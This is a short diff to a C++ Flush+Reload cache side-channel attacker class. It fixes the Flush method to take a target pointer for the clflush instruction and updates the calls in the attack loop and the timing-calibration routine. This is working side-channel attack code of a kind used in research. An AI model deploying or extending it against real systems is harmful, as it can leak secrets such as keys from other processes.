@@ -21,8 +21,8 @@ FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime) :
 FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime, int iteration) :
     Attacker(path, target, len, intervalTime, iteration) {}
 
-void FRAttacket::Flush(){
-    __asm__ __volatile__ ("clflush (%0)" :: "r"(p));
+void FRAttacker::Flush(void* toFlush){
+    __asm__ __volatile__ ("clflush (%0)" :: "r"(toFlush));
 }
 
 void FRAttacker::Attack() {
@@ -35,7 +35,7 @@ void FRAttacker::Attack() {
 
     // flush for the first time
     if (maxIterations > 0)
-        Flush();
+        Flush(targetPointer);
 
     // main attacking loop: wait, measure, flush
     for (int i = 0; i < maxIterations; i++) {
@@ -51,7 +51,7 @@ void FRAttacker::Configure() {
     unsigned int cyclesSum = 0;
     int numOfIterations = 100;
     for (i = 0; i < numOfIterations; i++) {
-        Flush();
+        Flush(targetPointer);
         cyclesSum += MeasureTime(targetPointer);
     }
     SetNoCacheTime(cyclesSum / numOfIterations);
